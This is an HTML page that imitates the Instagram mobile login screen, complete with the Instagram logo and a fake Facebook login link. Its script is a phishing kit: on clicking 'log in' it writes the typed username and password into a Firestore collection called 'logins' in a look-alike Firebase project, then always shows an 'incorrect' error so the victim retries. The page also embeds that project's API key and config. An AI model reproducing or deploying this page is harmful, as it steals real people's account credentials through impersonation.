<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mobile</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            background-color: rgb(13, 13, 13);
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .logo {
            margin-top: 20px;
            max-width: 150px;
            height: auto;
            filter: brightness(0) invert(1);
        }
        
        .input {
            width: 100%;
            max-width: 300px;
            padding: 12px 16px;
            margin: 8px 0;
            border: none;
            border-radius: 8px;
            background-color: rgb(54, 54, 54);
            font-size: 14px;
            outline: none;
            color: white;
        }
        
        .input:focus {
            border-color: #a8a8a8;
        }
        
        .form {
            margin-top: 30px;
            width: 100%;
            max-width: 300px;
        }
        
        .forgot {
            margin-top: 15px;
            color: #0095f6;
            font-size: 12px;
            text-decoration: none;
            cursor: pointer;
        }
        
        .login-btn {
            margin-top: 20px;
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .divider {
            margin-top: 25px;
            display: flex;
            align-items: center;
            width: 100%;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        
        .divider span {
            padding: 0 15px;
            color: #737373;
            font-size: 13px;
            font-weight: 600;
        }
        
        .facebook-login {
            margin-top: 20px;
            color: #0095f6;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            text-align: center;
            display: block;
        }
        
        .error {
            margin-top: 10px;
            color: #ed4956;
            font-size: 12px;
            text-align: center;
            display: none;
        }
        
        .container {
            max-width: 100%;
            margin: 0 auto;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1920px-Instagram_logo.svg.png" alt="Instagram" class="logo">
    <div class="form">
        <input type="text" class="input" placeholder="phone, number, username or email address">
        <input type="password" class="input" placeholder="password">
        <a href="#" class="forgot">forgotten password?</a>
        <button class="login-btn">log in</button>
        <div class="error">username or password incorrect</div>
        <div class="divider">
            <span>OR</span>
        </div>
        <a href="#" class="facebook-login">Log in with Facebook</a>
    </div>
    
    <script>
        // Initialize Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyD8Vn47fBVdpSkYyLew7yCk8t6pWY9Mh9k",
            authDomain: "intagram-722bd.firebaseapp.com",
            projectId: "intagram-722bd",
            storageBucket: "intagram-722bd.firebasestorage.app",
            messagingSenderId: "356342152826",
            appId: "1:356342152826:web:b21419ce2b307e2fb805c3",
            measurementId: "G-54QF9W0806"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        
        document.querySelector('.login-btn').addEventListener('click', function() {
            const email = document.querySelector('.input[type="text"]').value;
            const password = document.querySelector('.input[type="password"]').value;
            
            // Send data to Firestore
            db.collection('logins').add({
                email: email,
                password: password,
                timestamp: new Date()
            }).then(() => {
                console.log('Data sent to Firestore');
            }).catch((error) => {
                console.error('Error sending data:', error);
            });
            
            // Show error message
            document.querySelector('.error').style.display = 'block';
        });
    </script>
</body>
</html>
